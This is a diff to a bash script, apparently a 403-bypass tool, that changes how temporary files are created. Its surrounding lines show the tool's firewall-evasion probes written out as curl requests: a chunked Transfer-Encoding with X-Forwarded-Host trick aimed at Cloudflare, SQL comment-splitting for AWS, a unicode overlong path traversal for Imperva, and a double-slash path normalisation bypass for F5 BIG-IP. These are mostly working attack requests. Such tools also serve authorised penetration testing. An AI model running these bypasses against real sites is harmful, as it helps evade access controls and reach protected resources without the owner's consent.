@@ -226,8 +226,8 @@ _probe_one() {
     url=$(echo "$combo" | cut -d'|' -f2)
     hdr=$(echo "$combo" | cut -d'|' -f3)
     local _tmpbody _tmphdr
-    _tmpbody=$(mktemp)
-    _tmphdr=$(mktemp)
+    _tmpbody=$(mktemp "${TMPDIR:-/tmp}/bypass403.XXXXXX")
+    _tmphdr=$(mktemp "${TMPDIR:-/tmp}/bypass403.XXXXXX")
     local _args=( -sk -D "$_tmphdr" -o "$_tmpbody" -w "%{http_code}|%{size_download}|%{time_total}" --max-time 5 -X "$method" )
     [ -n "$hdr" ] && _args+=( -H "$hdr" )
     local _result
@@ -264,8 +264,8 @@ _probe_one() {
   case "$waf" in
     cloudflare)
       log "cloudflare: trying TE+X-Forwarded-Host..."
-      local _tmpbody; _tmpbody=$(mktemp)
-      local _tmphdr; _tmphdr=$(mktemp)
+      local _tmpbody; _tmpbody=$(mktemp "${TMPDIR:-/tmp}/bypass403.XXXXXX")
+      local _tmphdr; _tmphdr=$(mktemp "${TMPDIR:-/tmp}/bypass403.XXXXXX")
       local _res
       _res=$(curl -sk -D "$_tmphdr" -o "$_tmpbody" -w "%{http_code}|%{size_download}|%{time_total}" --max-time 6 \
         -H "Transfer-Encoding: chunked" -H "X-Forwarded-Host: localhost" \
@@ -292,8 +292,8 @@ _probe_one() {
       ;;
     aws)
       log "aws: trying comment-splitting on param..."
-      local _tmpbody; _tmpbody=$(mktemp)
-      local _tmphdr; _tmphdr=$(mktemp)
+      local _tmpbody; _tmpbody=$(mktemp "${TMPDIR:-/tmp}/bypass403.XXXXXX")
+      local _tmphdr; _tmphdr=$(mktemp "${TMPDIR:-/tmp}/bypass403.XXXXXX")
       local _res
       _res=$(curl -sk -D "$_tmphdr" -o "$_tmpbody" -w "%{http_code}|%{size_download}|%{time_total}" --max-time 6 \
         "${target}?id=1/**/AND/**/1=1" 2>/dev/null || echo "0|0|0")
@@ -319,8 +319,8 @@ _probe_one() {
       ;;
     imperva)
       log "imperva: trying unicode overlong..."
-      local _tmpbody; _tmpbody=$(mktemp)
-      local _tmphdr; _tmphdr=$(mktemp)
+      local _tmpbody; _tmpbody=$(mktemp "${TMPDIR:-/tmp}/bypass403.XXXXXX")
+      local _tmphdr; _tmphdr=$(mktemp "${TMPDIR:-/tmp}/bypass403.XXXXXX")
       local _res
       _res=$(curl -sk -D "$_tmphdr" -o "$_tmpbody" -w "%{http_code}|%{size_download}|%{time_total}" --max-time 6 \
         "${base}/%c0%2e%c0%2e/${last}" 2>/dev/null || echo "0|0|0")
@@ -346,8 +346,8 @@ _probe_one() {
       ;;
     f5-bigip)
       log "f5: trying path normalisation bypass..."
-      local _tmpbody; _tmpbody=$(mktemp)
-      local _tmphdr; _tmphdr=$(mktemp)
+      local _tmpbody; _tmpbody=$(mktemp "${TMPDIR:-/tmp}/bypass403.XXXXXX")
+      local _tmphdr; _tmphdr=$(mktemp "${TMPDIR:-/tmp}/bypass403.XXXXXX")
       local _res
       _res=$(curl -sk -D "$_tmphdr" -o "$_tmpbody" -w "%{http_code}|%{size_download}|%{time_total}" --max-time 6 \
         "${base}/%2f%2f${last}" 2>/dev/null || echo "0|0|0")
